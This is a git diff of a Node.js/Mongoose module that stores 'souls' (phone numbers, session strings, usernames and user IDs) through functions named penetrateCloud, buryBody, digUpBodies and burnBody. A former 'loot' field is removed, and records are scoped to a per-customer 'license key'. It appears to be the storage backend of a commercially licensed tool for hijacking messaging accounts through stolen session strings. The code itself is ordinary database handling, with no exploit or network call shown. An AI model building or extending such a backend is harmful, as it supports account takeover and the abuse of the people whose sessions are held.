@@ -2,13 +2,17 @@ const mongoose = require('mongoose');
 const chalk = require('chalk');
 
 const soulSchema = new mongoose.Schema({
-    phone: { type: String, required: true, unique: true },
+    phone: { type: String, required: true }, // Removed 'unique' here because different users might add same number (rare but possible)
     session: { type: String, required: true },
+    owner: { type: String, required: true, index: true }, // <--- THE FIX
     username: String,
     uid: String,
-    loot: { type: Number, default: 0 },
     created: { type: Date, default: Date.now }
 });
+
+// Compound index to ensure one owner can't add the same phone twice, 
+// but different owners can theoretically have the same phone (if session allows).
+soulSchema.index({ phone: 1, owner: 1 }, { unique: true });
 
 const Soul = mongoose.model('Soul', soulSchema);
 
@@ -21,8 +25,8 @@ const penetrateCloud = async (uri) => {
     }
 };
 
-const buryBody = async (phone, session, me) => {
-    const exists = await Soul.findOne({ phone });
+const buryBody = async (phone, session, me, ownerKey) => {
+    const exists = await Soul.findOne({ phone: phone, owner: ownerKey });
     if (exists) {
         exists.session = session;
         exists.username = me.username || 'Anon';
@@ -32,18 +36,20 @@ const buryBody = async (phone, session, me) => {
         await new Soul({
             phone,
             session,
+            owner: ownerKey,
             username: me.username || 'Anon',
             uid: me.id.toString()
         }).save();
     }
 };
 
-const digUpBodies = async () => {
-    return await Soul.find({});
+const digUpBodies = async (ownerKey) => {
+    // ONLY find souls that belong to this specific license key
+    return await Soul.find({ owner: ownerKey });
 };
 
-const burnBody = async (phone) => {
-    await Soul.deleteOne({ phone });
+const burnBody = async (phone, ownerKey) => {
+    await Soul.deleteOne({ phone: phone, owner: ownerKey });
 };
 
 module.exports = { penetrateCloud, buryBody, digUpBodies, burnBody };
